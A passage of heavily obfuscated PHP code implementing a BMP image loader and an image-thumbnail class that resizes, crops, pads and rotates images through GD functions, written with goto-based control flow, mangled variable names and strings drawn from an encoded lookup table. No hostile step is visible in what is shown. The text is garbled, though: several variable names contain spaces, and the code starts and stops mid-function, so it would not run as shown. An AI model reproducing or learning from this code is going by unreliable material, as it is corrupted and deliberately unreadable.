$Fú˘ŒÀ÷úê = $Fú˘ŒÀ÷úê ? "\x48\124\124\x50\x2f\x31\56\x31\x20{$B“Ÿ©ÙóØÖ}\x20" . $Fú˘ŒÀ÷úê : $Cì‘≈µÃ®’[33]; return $Fú˘ŒÀ÷úê; } } class ImageGdBMP { public static function load($AÁ“¡Î—»—) { $B÷ﬁó≈‘©¶ = fopen($AÁ“¡Î—»—, $_SERVER[¯èãÄπµ][1503]); if ($B÷ﬁó≈‘©¶ === !1) { return !1; } $BÇµö˘Àπõ = self::loadFromStream($B÷ﬁó≈‘©¶); fclose($B÷ﬁó≈‘©¶); return $BÇµö˘Àπõ; } public static function loadFromStream($bÆçÙûØñê) { $F·ÕÃ¯„™⁄ =& $_SERVER[¯èãÄπµ]; $F⁄Ãñ∑ªÎ¡ = fread($bÆçÙûØñê, 14); if ($F⁄Ãñ∑ªÎ¡ === !1) { return !1; } if ($F⁄Ãñ∑ªÎ¡[0] != $F·ÕÃ¯„™⁄[1815] || $F⁄Ãñ∑ªÎ¡[1] != $F·ÕÃ¯„™⁄[1816]) { return !1; } $BØ”—‹´◊Û = unpack($F·ÕÃ¯„™⁄[1817] . $F·ÕÃ¯„™⁄[1818] . $F·ÕÃ¯„™⁄[1819] . $F·ÕÃ¯„™⁄[1820] . $F·ÕÃ¯„™⁄[1821], $F⁄Ãñ∑ªÎ¡); return self::loadFromStreamAndFileHeader($bÆçÙûØñê, $BØ”—‹´◊Û); } public static function loadFromStreamAndFileHeader($Fçœ–åµÔˆ, array $dœÜ¨»©¨Œ) { goto CøéÉ»„ñ˜; e‚∏∂ø©á“: $cÊŸØ∆ ≥Â = abs($e∞êπØÉƒŒ); $Càºëﬂ°Á‰ = $e∞êπØÉƒŒ > 0 ? $cÊŸØ∆ ≥Â - 1 : 0; $A£”á¯Êõ™ = $e∞êπØÉƒŒ > 0 ? -1 : 1; goto B÷∆ÌˆØöÍ; c«ßÜØ”∏“: if ($f≤ß∞¶–ˆ∏ == 0 || $e∞êπØÉƒŒ == 0 || $EﬁíûœáÍò != 1 || ($e†Úß£¯íΩ & $DòÀ”ü¡‚û) != 0 || ($e†Úß£¯íΩ & $Cª ¡≠ôÈÃ) != 0 || ($e†Úß£¯íΩ & $cÛù¯»÷È¶) != 0 || ($DòÀ”ü¡‚û & $Cª ¡≠ôÈÃ) != 0 || ($DòÀ”ü¡‚û & $cÛù¯»÷È¶) != 0 || ($Cª ¡≠ôÈÃ & $cÛù¯»÷È¶) != 0) { return !1; } if ($d»ØïÔ≤Ñ¬ == 4 || $d»ØïÔ≤Ñ¬ == 5) { $dÉº¿îç´Ø = stream_get_contents($Fçœ–åµÔˆ, $Bê∫éÊØ†ì); if ($dÉº¿îç´Ø === !1) { return !1; } return imagecreatefromstring($dÉº¿îç´Ø); } $FØæ¡––Íê = $f≤ß∞¶–ˆ∏ * $f§‚ƒãﬁ∂Â + 31 >> 3 & ~3; goto e‚∏∂ø©á“; B÷∆ÌˆØöÍ: if ($f§‚ƒãﬁ∂Â == 1 || $f§‚ƒãﬁ∂Â == 4 || $f§‚ƒãﬁ∂Â == 8) { goto FÒΩË¬—€´; Eë¥èƒá¢ê: $A£‘›˜àÑÍ = (1 << $f§‚ƒãﬁ∂Â) - 1 << $e∫”√ÿ¯Î®; if ($d»ØïÔ≤Ñ¬ == 1 || $d»ØïÔ≤Ñ¬ == 2) { $Dº¢æ©Úüï = 0; $e„∆≤öœ´ß = $f§‚ƒãﬁ∂Â >> 2 & 1; for (;;) { if ($Dº¢æ©Úüï < -1 || $Dº¢æ©Úüï > $f≤ß∞¶–ˆ∏ || $Càºëﬂ°Á‰ < -1 || $Càºëﬂ°Á‰ > $e∞êπØÉƒŒ) { imagedestroy($AÕÿ…ßø∞ë); return !1; } $dÉº¿îç´Ø = fread($Fçœ–åµÔˆ, 1); if ($dÉº¿îç´Ø === !1) { imagedestroy($AÕÿ…ßø∞ë); return !1; } switch ($dÉº¿îç´Ø) { case $Dı∞¿≥‘§÷[1840]: $dÉº¿îç´Ø = fread($Fçœ–åµÔˆ, 1); if ($dÉº¿îç´Ø === !1) { imagedestroy($AÕÿ…ßø∞ë); return !1; } switch ($dÉº¿îç´Ø) { case $Dı∞¿≥‘§÷[1840]: $Càºëﬂ°Á‰ += $A£”á¯Êõ™; $Dº¢æ©Úüï = 0; break; case $Dı∞¿≥‘§÷[1842]: $Càºëﬂ°Á‰ = 0; $Dº¢æ©Úüï = 0; break 3; case $Dı∞¿≥‘§÷[1843]: $dÉº¿îç´Ø = fread($Fçœ–åµÔˆ, 2); if ($dÉº¿îç´Ø === !1) { imagedestroy($AÕÿ…ßø∞ë); return !1; } list(, $d∏≤€ÌèâÁ, $CãÑ–áÙôî) = unpack($Dı∞¿≥‘§÷[1844], $dÉº¿îç´Ø); $Dº¢æ©Úüï += $d∏≤€ÌèâÁ; $Càºëﬂ°Á‰ += $CãÑ–áÙôî * $A£”á¯Êõ™; break; default: list(, $f…∆âãª∑µ) = unpack($Dı∞¿≥‘§÷[1845], $dÉº¿îç´Ø); $AœÌ†¯‡≤ú = ($f…∆âãª∑µ >> $e„∆≤öœ´ß) + ($f…∆âãª∑µ & $e„∆≤öœ´ß); $dÉº¿îç´Ø = fread($Fçœ–åµÔˆ, $AœÌ†¯‡≤ú + 1 & ~1); if ($dÉº¿îç´Ø === !1) { imagedestroy($AÕÿ…ßø∞ë); return !1; } for ($E”›ÃèÖ¥ = 0, $f–˜∞¶‰€≥ = 0; $E”›ÃèÖ¥ < $f…∆âãª∑µ; ++$E”›ÃèÖ¥, ++$Dº¢æ©Úüï, $f–˜∞¶‰€≥ += $f§‚ƒãﬁ∂Â) { list(, $B‰ˆãü’æó) = unpack($Dı∞¿≥‘§÷[1845], $dÉº¿îç´Ø[$f–˜∞¶‰€≥ >> 3]); $Cπöùïä˜ö = $f–˜∞¶‰€≥ & 7; imagesetpixel($AÕÿ…ßø∞ë, $Dº¢æ©Úüï, $Càºëﬂ°Á‰, $f†∂≥°øı≤[($B‰ˆãü’æó & $A£‘›˜àÑÍ >> $Cπöùïä˜ö) >> $e∫”√ÿ¯Î® - $Cπöùïä˜ö]); } break; } break; default: $A–∂‹éùÈÎ = fread($Fçœ–åµÔˆ, 1); if ($A–∂‹éùÈÎ === !1) { imagedestroy($AÕÿ…ßø∞ë); return !1; } list(, $cè¬™ìÃÉÑ, $B‰ˆãü’æó) = unpack($Dı∞¿≥‘§÷[1844], $dÉº¿îç´Ø . $A–∂‹éùÈÎ); for ($E”›ÃèÖ¥ = 0, $f–˜∞¶‰€≥ = 0; $E”›ÃèÖ¥ < $cè¬™ìÃÉÑ; ++$E”›ÃèÖ¥, ++$Dº¢æ©Úüï, $f–˜∞¶‰€≥ += $f§‚ƒãﬁ∂Â) { $Cπöùïä˜ö = $f–˜∞¶‰€≥ & 7; imagesetpixel($AÕÿ…ßø∞ë, $Dº¢æ©Úüï, $Càºëﬂ°Á‰, $f†∂≥°øı≤[($B‰ˆãü’æó & $A£‘›˜àÑÍ >> $Cπöùïä˜ö) >> $e∫”√ÿ¯Î® - $Cπöùïä˜ö]); } break; } } } else { for ($aŒºç›üÕ† = 0; $aŒºç›üÕ† < $cÊŸØ∆ ≥Â; ++$aŒºç›üÕ†, $Càºëﬂ°Á‰ += $A£”á¯Êõ™) { $dÉº¿îç´Ø = fread($Fçœ–åµÔˆ, $FØæ¡––Íê); if ($dÉº¿îç´Ø === !1) { imagedestroy($AÕÿ…ßø∞ë); return !1; } $f–˜∞¶‰€≥ = 0; for ($Dº¢æ©Úüï = 0; $Dº¢æ©Úüï < $f≤ß∞¶–ˆ∏; ++$Dº¢æ©Úüï, $f–˜∞¶‰€≥ += $f§‚ƒãﬁ∂Â) { list(, $B‰ˆãü’æó) = unpack($Dı∞¿≥‘§÷[1845], $dÉº¿îç´Ø[$f–˜∞¶‰€≥ >> 3]); $Cπöùïä˜ö = $f–˜∞¶‰€≥ & 7; imagesetpixel($AÕÿ…ßø∞ë, $Dº¢æ©Úüï, $Càºëﬂ°Á‰, $f†∂≥°øı≤[($B‰ˆãü’æó & $A£‘›˜àÑÍ >> $Cπöùïä˜ö) >> $e∫”√ÿ¯Î® - $Cπöùïä˜ö]); } } } goto Bèø≈ô¬Ó¬; FÒΩË¬—€´: $AÕÿ…ßø∞ë = imagecreate($f≤ß∞¶–ˆ∏, $cÊŸØ∆ ≥Â); $C‰⁄€ó∞àû = $d çÆòÔÀ∏ == 12 ? 3 : 4; $Eø…Ûî¢¢ë = $FÃ´∂îƒªø ? $FÃ´∂îƒªø : pow(2, $f§‚ƒãﬁ∂Â); goto Aê⁄¬Êç≈Ú; Aê⁄¬Êç≈Ú: $f†∂≥°øı≤ = array(); for ($E”›ÃèÖ¥ = 0; $E”›ÃèÖ¥ < $Eø…Ûî¢¢ë; ++$E”›ÃèÖ¥) { $dÉº¿îç´Ø = fread($Fçœ–åµÔˆ, $C‰⁄€ó∞àû); if ($dÉº¿îç´Ø === !1) { imagedestroy($AÕÿ…ßø∞ë); return !1; } extract(unpack($Dı∞¿≥‘§÷[1841], $dÉº¿îç´Ø . $Dı∞¿≥‘§÷[1840])); $f†∂≥°øı≤[] = imagecolorallocate($AÕÿ…ßø∞ë, $dÕó∑í«Ö≤, $a ‹ÈΩ“¥Ì, $Cπöùïä˜ö); } $e∫”√ÿ¯Î® = 8 - $f§‚ƒãﬁ∂Â; goto Eë¥èƒá¢ê; Bèø≈ô¬Ó¬: } else { goto F™ÈËÛó©ã; F”•⁄ÆΩ¶√: $BÜ¬◊§é√ç = $DòÀ”ü¡‚û ? 1 / $DòÀ”ü¡‚û : 1; $B¿ïê»‡Àº = $Cª ¡≠ôÈÃ ? 1 / $Cª ¡≠ôÈÃ : 1; $Cüãíä∑¢Ñ = $cÛù¯»÷È¶ ? 1 / $cÛù¯»÷È¶ : 1; goto c’ô©ã•ì ; F™ÈËÛó©ã: $AÕÿ…ßø∞ë = imagecreatetruecolor($f≤ß∞¶–ˆ∏, $cÊŸØ∆ ≥Â); imagealphablending($AÕÿ…ßø∞ë, !1); if ($e†Úß£¯íΩ) { imagesavealpha($AÕÿ…ßø∞ë, !0); } goto A÷˜ÖïøÌ°; c’ô©ã•ì : for ($aŒºç›üÕ† = 0; $aŒºç›üÕ† < $cÊŸØ∆ ≥Â; ++$aŒºç›üÕ†, $Càºëﬂ°Á‰ += $A£”á¯Êõ™) { $dÉº¿îç´Ø = fread($Fçœ–åµÔˆ, $FØæ¡––Íê); if ($dÉº¿îç´Ø === !1) { imagedestroy($AÕÿ…ßø∞ë); return !1; } $f–˜∞¶‰€≥ = 0; for ($Dº¢æ©Úüï = 0; $Dº¢æ©Úüï < $f≤ß∞¶–ˆ∏; ++$Dº¢æ©Úüï, $f–˜∞¶‰€≥ += $B®ªàÙ”º®) { list(, $B‰ˆãü’æó) = unpack($Dı∞¿≥‘§÷[1822], substr($dÉº¿îç´Ø, $f–˜∞¶‰€≥, $B®ªàÙ”º®) . $Dı∞¿≥‘§÷[1846]); $eèÏÑÑÔÌé = $B‰ˆãü’æó & $e†Úß£¯íΩ; $C±Ú¶âò·¡ = $B‰ˆãü’æó & $DòÀ”ü¡‚û; $câ∏ﬁãÑı› = $B‰ˆãü’æó & $Cª ¡≠ôÈÃ; $F¶£òÒÂª‹ = $B‰ˆãü’æó & $cÛù¯»÷È¶; $AÒÇÜΩ¡Ëì = $Dä∂äî◊Úô - (($eèÏÑÑÔÌé << 7) - $eèÏÑÑÔÌé) * $A™àÓÌ¥È–; $dÕó∑í«Ö≤ = (($C±Ú¶âò·¡ << 8) - $C±Ú¶âò·¡) * $BÜ¬◊§é√ç; $a ‹ÈΩ“¥Ì = (($câ∏ﬁãÑı› << 8) - $câ∏ﬁãÑı›) * $B¿ïê»‡Àº; $Cπöùïä˜ö = (($F¶£òÒÂª‹ << 8) - $F¶£òÒÂª‹) * $Cüãíä∑¢Ñ; imagesetpixel($AÕÿ…ßø∞ë, $Dº¢æ©Úüï, $Càºëﬂ°Á‰, $AÒÇÜΩ¡Ëì << 24 | $dÕó∑í«Ö≤ << 16 | $a ‹ÈΩ“¥Ì << 8 | $Cπöùïä˜ö); } } imagealphablending($AÕÿ…ßø∞ë, !0); goto fô‰‚ ïç„; A÷˜ÖïøÌ°: $B®ªàÙ”º® = $f§‚ƒãﬁ∂Â >> 3; $Dä∂äî◊Úô = $e†Úß£¯íΩ ? 127 : 0; $A™àÓÌ¥È– = $e†Úß£¯íΩ ? 1 / $e†Úß£¯íΩ : 1; goto F”•⁄ÆΩ¶√; fô‰‚ ïç„: } return $AÕÿ…ßø∞ë; goto C™ëÙ¿õªŸ; CøéÉ»„ñ˜: $Dı∞¿≥‘§÷ =& $_SERVER[¯èãÄπµ]; if ($dœÜ¨»©¨Œ[$Dı∞¿≥‘§÷[384]] != 19778) { return !1; } $dÉº¿îç´Ø = fread($Fçœ–åµÔˆ, 4); goto Fóî¨çºœ›; Fóî¨çºœ›: if ($dÉº¿îç´Ø === !1) { return !1; } list(, $d çÆòÔÀ∏) = unpack($Dı∞¿≥‘§÷[1822], $dÉº¿îç´Ø); if ($d çÆòÔÀ∏ == 12) { goto bì´“©◊ÈÖ; cπÔ±çø®±: $cÛù¯»÷È¶ = 255; goto aŸı·¡æ–Ú; bì´“©◊ÈÖ: $dÉº¿îç´Ø = fread($Fçœ–åµÔˆ, $d çÆòÔÀ∏ - 4); if ($dÉº¿îç´Ø === !1) { return !1; } extract(unpack($Dı∞¿≥‘§÷[1823] . $Dı∞¿≥‘§÷[1824] . $Dı∞¿≥‘§÷[1825] . $Dı∞¿≥‘§÷[1826], $dÉº¿îç´Ø)); goto c“¿≥°µ±Ÿ; c“¿≥°µ±Ÿ: $FÃ´∂îƒªø = $CÇïÏëÏ√è = $e†Úß£¯íΩ = $d»ØïÔ≤Ñ¬ = 0; $DòÀ”ü¡‚û = 16711680; $Cª ¡≠ôÈÃ = 65280; goto cπÔ±çø®±; aŸı·¡æ–Ú: } else { if (124 < $d çÆòÔÀ∏ || $d çÆòÔÀ∏ < 40) { return !1; } else { goto A∑˘æÍÙÇ—; A∑˘æÍÙÇ—: $dÉº¿îç´Ø = fread($Fçœ–åµÔˆ, 36); if ($dÉº¿îç´Ø === !1) { return !1; } extract(unpack($Dı∞¿≥‘§÷[1827] . $Dı∞¿≥‘§÷[1828] . $Dı∞¿≥‘§÷[1825] . $Dı∞¿≥‘§÷[1829] . $Dı∞¿≥‘§÷[1830] . $Dı∞¿≥‘§÷[1831] . $Dı∞¿≥‘§÷[1832] . $Dı∞¿≥‘§÷[1833] . $Dı∞¿≥‘§÷[1834] . $Dı∞¿≥‘§÷[1835], $dÉº¿îç´Ø)); goto F·ÆçÈÀ≠Î; D„ˆ‚Ö«Æ∏: if ($D÷Ñ©πÂã› & 2147483648) { $D÷Ñ©πÂã› = -(~$D÷Ñ©πÂã› & 4294967295) - 1; } if ($dœÜ¨»©¨Œ[$Dı∞¿≥‘§÷[516]] != 0) { $bÖ®·‹ıÓ‚ = $f§‚ƒãﬁ∂Â == 1 || $f§‚ƒãﬁ∂Â == 4 || $f§‚ƒãﬁ∂Â == 8 ? ($FÃ´∂îƒªø ? $FÃ´∂îƒªø : pow(2, $f§‚ƒãﬁ∂Â)) << 2 : 0; $FñªºÜâßô = $Bê∫éÊØ†ì ? $Bê∫éÊØ†ì : ($f≤ß∞¶–ˆ∏ * $f§‚ƒãﬁ∂Â + 31 >> 3 & ~3) * abs($e∞êπØÉƒŒ); $f≤¿ß§çæá = $dœÜ¨»©¨Œ[$Dı∞¿≥‘§÷[516]] - $FñªºÜâßô - $bÖ®·‹ıÓ‚ - 14; if ($d çÆòÔÀ∏ < $f≤¿ß§çæá && 40 <= $d çÆòÔÀ∏ && $d çÆòÔÀ∏ <= 124) { $d çÆòÔÀ∏ = $f≤¿ß§çæá; } } if ($d çÆòÔÀ∏ - 40 > 0) { $dÉº¿îç´Ø = fread($Fçœ–åµÔˆ, $d çÆòÔÀ∏ - 40); if ($dÉº¿îç´Ø === !1) { return !1; } extract(unpack($Dı∞¿≥‘§÷[1836] . $Dı∞¿≥‘§÷[1837] . $Dı∞¿≥‘§÷[1838] . $Dı∞¿≥‘§÷[1839], $dÉº¿îç´Ø . str_repeat($Dı∞¿≥‘§÷[1840], 120))); } else { $e†Úß£¯íΩ = $DòÀ”ü¡‚û = $Cª ¡≠ôÈÃ = $cÛù¯»÷È¶ = 0; } goto fîüéÙ∫‹é; fîüéÙ∫‹é: if (($f§‚ƒãﬁ∂Â == 16 || $f§‚ƒãﬁ∂Â == 24 || $f§‚ƒãﬁ∂Â == 32) && $d»ØïÔ≤Ñ¬ == 0 && $DòÀ”ü¡‚û == 0 && $Cª ¡≠ôÈÃ == 0 && $cÛù¯»÷È¶ == 0) { switch ($f§‚ƒãﬁ∂Â) { case 16: $DòÀ”ü¡‚û = 31744; $Cª ¡≠ôÈÃ = 992; $cÛù¯»÷È¶ = 31; break; case 24: case 32: $DòÀ”ü¡‚û = 16711680; $Cª ¡≠ôÈÃ = 65280; $cÛù¯»÷È¶ = 255; break; } } goto c“ÏäÌÑäﬁ; F·ÆçÈÀ≠Î: if ($f≤ß∞¶–ˆ∏ & 2147483648) { $f≤ß∞¶–ˆ∏ = -(~$f≤ß∞¶–ˆ∏ & 4294967295) - 1; } if ($e∞êπØÉƒŒ & 2147483648) { $e∞êπØÉƒŒ = -(~$e∞êπØÉƒŒ & 4294967295) - 1; } if ($fØ√Ê™åñ¥ & 2147483648) { $fØ√Ê™åñ¥ = -(~$fØ√Ê™åñ¥ & 4294967295) - 1; } goto D„ˆ‚Ö«Æ∏; c“ÏäÌÑäﬁ: } } goto c«ßÜØ”∏“; C™ëÙ¿õªŸ: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($câµ¡ËºÀ–, $DäãÖΩßÈà) { goto a∫»Û§ı›; e„∆£é©·Ô: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto dêÍµÂ†ÿ⁄; A÷†≥äòáÇ: if (!$this->im) { return !1; } $FΩµ’Èâ≤Î = $_SERVER[¯èãÄπµ][33]; $this->imgData = GetImageSize($câµ¡ËºÀ–, $FΩµ’Èâ≤Î); goto e„∆£é©·Ô; a∫»Û§ı›: $this->srcFile = $câµ¡ËºÀ–; $this->echoType = $DäãÖΩßÈà; $this->im = self::image($câµ¡ËºÀ–); goto A÷†≥äòáÇ; dêÍµÂ†ÿ⁄: } public static function image($EÜ≤ó“ºÕ≥) { $dïÎÖÜŸ∫ß =& $_SERVER[¯èãÄπµ]; $c¬∑ÊÑå‚Ü = $dïÎÖÜŸ∫ß[33]; $c∏®±Ò⁄¨ï = GetImageSize($EÜ≤ó“ºÕ≥, $c¬∑ÊÑå‚Ü); $F¥†ä÷Üˆƒ = !1; switch ($c∏®±Ò⁄¨ï[2]) { case IMAGETYPE_GIF: if (!function_exists($dïÎÖÜŸ∫ß[1847])) { break; } $F¥†ä÷Üˆƒ = imagecreatefromgif($EÜ≤ó“ºÕ≥); break; case IMAGETYPE_JPEG: if (!function_exists($dïÎÖÜŸ∫ß[1848])) { break; } $F¥†ä÷Üˆƒ = imagecreatefromjpeg($EÜ≤ó“ºÕ≥); break; case IMAGETYPE_PNG: if (!function_exists($dïÎÖÜŸ∫ß[1849])) { break; } $F¥†ä÷Üˆƒ = @imagecreatefrompng($EÜ≤ó“ºÕ≥); imagesavealpha($F¥†ä÷Üˆƒ, !0); break; case IMAGETYPE_XBM: $F¥†ä÷Üˆƒ = imagecreatefromxbm($EÜ≤ó“ºÕ≥); break; case IMAGETYPE_WBMP: $F¥†ä÷Üˆƒ = imagecreatefromwbmp($EÜ≤ó“ºÕ≥); break; case IMAGETYPE_BMP: $F¥†ä÷Üˆƒ = imagecreatefrombmp($EÜ≤ó“ºÕ≥); break; default: break; } return $F¥†ä÷Üˆƒ; } public static function imageSize($cÑ±£†‘ÖŸ) { $B¢è®Ù≠»Ô =& $_SERVER[¯èãÄπµ]; $EàåóÒƒ˘® = GetImageSize($cÑ±£†‘ÖŸ); if (!$EàåóÒƒ˘®) { return !1; } return array($B¢è®Ù≠»Ô[1850] => $EàåóÒƒ˘®[0], $B¢è®Ù≠»Ô[1851] => $EàåóÒƒ˘®[1]); } function distortion($dÛûÉ’Øñ†, $EΩä“ÇΩ·â, $aèÒ„Ù«å®) { $f‘Ç‚»Ïêã = $this->creatImage($this->im, $EΩä“ÇΩ·â, $aèÒ„Ù«å®, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($f‘Ç‚»Ïêã, $dÛûÉ’Øñ†); } function prorate($F–’ÕËÆ«Ï, $AÑº¡ÔÌ‡Ï, $Cì±±ÜÊŒ‰) { $cá†àΩÓ∫ÿ = $AÑº¡ÔÌ‡Ï / $Cì±±ÜÊŒ‰; $aÕ´”œÆÌ· = $this->srcW / $this->srcH; if ($cá†àΩÓ∫ÿ <= $aÕ´”œÆÌ·) { $dÀ∞¨£®ı≈ = $AÑº¡ÔÌ‡Ï; $bÁç∫°“Ü„ = $dÀ∞¨£®ı≈ * ($this->srcH / $this->srcW); } else { $bÁç∫°“Ü„ = $Cì±±ÜÊŒ‰; $dÀ∞¨£®ı≈ = $bÁç∫°“Ü„ * ($this->srcW / $this->srcH); } if ($this->srcW > $AÑº¡ÔÌ‡Ï || $this->srcH > $Cì±±ÜÊŒ‰) { $FÎáñıüóœ = $this->creatImage($this->im, $dÀ∞¨£®ı≈, $bÁç∫°“Ü„, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($FÎáñıüóœ, $F–’ÕËÆ«Ï); } else { $FÎáñıüóœ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($FÎáñıüóœ, $F–’ÕËÆ«Ï); } } function cut($EπÜÇÏå¢√, $Eç˜í≥áí°, $cèä¿ÈÏø¥) { goto F∑’Î”Éäπ; F£àÚå∂˘: $aÓªû±∫ÙÙ = $this->creatImage($this->im, $f±ÑèëÍ‹≠, $DÑÁò√ßÌ¬, 0, 0, 0, 0, $this->srcW, $this->srcH); $fì∫…¨ı‡≤ = $this->creatImage($aÓªû±∫ÙÙ, $Eç˜í≥áí°, $cèä¿ÈÏø¥, 0, 0, ($f±ÑèëÍ‹≠ - $Eç˜í≥áí°) / 2, ($DÑÁò√ßÌ¬ - $cèä¿ÈÏø¥) / 2, $Eç˜í≥áí°, $cèä¿ÈÏø¥); imageDestroy($aÓªû±∫ÙÙ); goto Fæ√ãÂä¡≈; F∑’Î”Éäπ: $EÇ“èå©àê = $Eç˜í≥áí° / $cèä¿ÈÏø¥; $e‚Ö« ÃÖ† = $this->srcW / $this->srcH; if ($EÇ“èå©àê <= $e‚Ö« ÃÖ†) { $DÑÁò√ßÌ¬ = $cèä¿ÈÏø¥; $f±ÑèëÍ‹≠ = $DÑÁò√ßÌ¬ * ($this->srcW / $this->srcH); } else { $f±ÑèëÍ‹≠ = $Eç˜í≥áí°; $DÑÁò√ßÌ¬ = $f±ÑèëÍ‹≠ * ($this->srcH / $this->srcW); } goto F£àÚå∂˘; Fæ√ãÂä¡≈: return $this->echoImage($fì∫…¨ı‡≤, $EπÜÇÏå¢√); goto BÇ„±Ö±ßÿ; BÇ„±Ö±ßÿ: } function backFill($EÃ∏™∆•çå, $f√üÇÿõÕØ, $AÑÉ‡è◊ï , $Dìï◊™Ñî = false, $dø‚åÕç∫® = 255, $fﬂ©‰Ë∏ÍΩ = 255, $dù“Ïî¯˜Ç = 255) { goto CºàÆΩ≥º¯; A–Î∂ÆÁüﬂ: if ($Dìï◊™Ñî) { $d÷ÛÈ≤„ÖÇ = imageColorTransparent($C÷Çë”µØﬁ, $d÷ÛÈ≤„ÖÇ); $a∑å≤‘æ∑Œ = $AÑÉ‡è◊ï  - $f±Êåﬁ€Î‰; } imageFilledRectangle($C÷Çë”µØﬁ, 0, 0, $f√üÇÿõÕØ, $AÑÉ‡è◊ï , $d÷ÛÈ≤„ÖÇ); if ($this->srcW > $f√üÇÿõÕØ || $this->srcH > $AÑÉ‡è◊ï ) { $cÉﬂó”ŒÖß = $this->creatImage($this->im, $C◊ˆî±ò·é, $f±Êåﬁ€Î‰, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($C◊ˆî±ò·é < $f√üÇÿõÕØ) { imageCopy($C÷Çë”µØﬁ, $cÉﬂó”ŒÖß, ($f√üÇÿõÕØ - $C◊ˆî±ò·é) / 2, 0, 0, 0, $C◊ˆî±ò·é, $f±Êåﬁ€Î‰); } else { if ($f±Êåﬁ€Î‰ < $AÑÉ‡è◊ï ) { imageCopy($C÷Çë”µØﬁ, $cÉﬂó”ŒÖß, 0, $a∑å≤‘æ∑Œ, 0, 0, $C◊ˆî±ò·é, $f±Êåﬁ€Î‰); } else { imageCopy($C÷Çë”µØﬁ, $cÉﬂó”ŒÖß, 0, 0, 0, 0, $C◊ˆî±ò·é, $f±Êåﬁ€Î‰); } } } else { imageCopyMerge($C÷Çë”µØﬁ, $this->im, ($f√üÇÿõÕØ - $C◊ˆî±ò·é) / 2, $a∑å≤‘æ∑Œ, 0, 0, $C◊ˆî±ò·é, $f±Êåﬁ€Î‰, 100); } goto FÓ•†Û©¶à; CºàÆΩ≥º¯: $aµ·⁄Êå™Ú = $f√üÇÿõÕØ / $AÑÉ‡è◊ï ; $a€Çù’¶Òº = $this->srcW / $this->srcH; if ($aµ·⁄Êå™Ú <= $a€Çù’¶Òº) { $C◊ˆî±ò·é = $f√üÇÿõÕØ; $f±Êåﬁ€Î‰ = $C◊ˆî±ò·é * ($this->srcH / $this->srcW); } else { $f±Êåﬁ€Î‰ = $AÑÉ‡è◊ï ; $C◊ˆî±ò·é = $f±Êåﬁ€Î‰ * ($this->srcW / $this->srcH); } goto dÁ∆êë£°–; FÓ•†Û©¶à: return $this->echoImage($C÷Çë”µØﬁ, $EÃ∏™∆•çå); goto fìÃØÚˆ‹≠; dÁ∆êë£°–: if (function_exists($_SERVER[¯èãÄπµ][1852])) { @($C÷Çë”µØﬁ = imageCreateTrueColor($f√üÇÿõÕØ, $AÑÉ‡è◊ï )); if (!$C÷Çë”µØﬁ) { $C÷Çë”µØﬁ = imageCreate($f√üÇÿõÕØ, $AÑÉ‡è◊ï ); } } else { $C÷Çë”µØﬁ = imageCreate($f√üÇÿõÕØ, $AÑÉ‡è◊ï ); } $a∑å≤‘æ∑Œ = ($AÑÉ‡è◊ï  - $f±Êåﬁ€Î‰) / 2; $d÷ÛÈ≤„ÖÇ = imagecolorallocate($C÷Çë”µØﬁ, $dø‚åÕç∫®, $fﬂ©‰Ë∏ÍΩ, $dù“Ïî¯˜Ç); goto A–Î∂ÆÁüﬂ; fìÃØÚˆ‹≠: } function creatImage($fë´∏¨´ò¬, $b’ùèÆø“≥, $BÍ„‰ﬂÆ‰ë, $FÆ®ìÙªû´, $EÉÁ¿»Éí˜, $EÃ§œÕ≈ôÛ, $a‡âå¨ãÆà, $cƒ¬Á’üÙÇ, $F∫≈÷Ø‚çå) { if (function_exists($_SERVER[¯èãÄπµ][1852])) { @($EÜèñ¥ù˜° = ImageCreateTrueColor($b’ùèÆø“≥, $BÍ„‰ﬂÆ‰ë)); @imagealphablending($EÜèñ¥ù˜°, !1); @imagesavealpha($EÜèñ¥ù˜°, !0); if ($EÜèñ¥ù˜°) { imageCopyResampled($EÜèñ¥ù˜°, $fë´∏¨´ò¬, $FÆ®ìÙªû´, $EÉÁ¿»Éí˜, $EÃ§œÕ≈ôÛ, $a‡âå¨ãÆà, $b’ùèÆø“≥, $BÍ„‰ﬂÆ‰ë, $cƒ¬Á’üÙÇ, $F∫≈÷Ø‚çå); } else { $EÜèñ¥ù˜° = ImageCreate($b’ùèÆø“≥, $BÍ„‰ﬂÆ‰ë); imageCopyResized($EÜèñ¥ù˜°, $fë´∏¨´ò¬, $FÆ®ìÙªû´, $EÉÁ¿»Éí˜, $EÃ§œÕ≈ôÛ, $a‡âå¨ãÆà, $b’ùèÆø“≥, $BÍ„‰ﬂÆ‰ë, $cƒ¬Á’üÙÇ, $F∫≈÷Ø‚çå); } } else { $EÜèñ¥ù˜° = ImageCreate($b’ùèÆø“≥, $BÍ„‰ﬂÆ‰ë); imageCopyResized($EÜèñ¥ù˜°, $fë´∏¨´ò¬, $FÆ®ìÙªû´, $EÉÁ¿»Éí˜, $EÃ§œÕ≈ôÛ, $a‡âå¨ãÆà, $b’ùèÆø“≥, $BÍ„‰ﬂÆ‰ë, $cƒ¬Á’üÙÇ, $F∫≈÷Ø‚çå); } return $EÜèñ¥ù˜°; } public function imgRotate($c®óÜŸØîß, $Bµ±à™œ‘») { goto DÉ”¨Ò≠˜à; DÉ”¨Ò≠˜à: if (!$this->im || $Bµ±à™œ‘» % 360 === 0 || !function_exists($_SERVER[¯èãÄπµ][1853])) { return !1; } $b©›ÙÑﬂçâ = imageRotate($this->im, 360 - $Bµ±à™œ‘», 0); $DÍ…Ë…€® = !1; goto cí∑èÃºáœ; Fåô≠⁄Á◊Ô: return $DÍ…Ë…€®; goto dü©ßÇò¶Î; cí∑èÃºáœ: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $DÍ…Ë…€® = imagegif($b©›ÙÑﬂçâ, $c®óÜŸØîß); break; case IMAGETYPE_JPEG: $DÍ…Ë…€® = imagejpeg($b©›ÙÑﬂçâ, $c®óÜŸØîß, 100); break; case IMAGETYPE_PNG: $DÍ…Ë…€® = imagePNG($b©›ÙÑﬂçâ, $c®óÜŸØîß); break; default: break; } imageDestroy($b©›ÙÑﬂçâ); imageDestroy($this->im); goto Fåô≠⁄Á◊Ô; 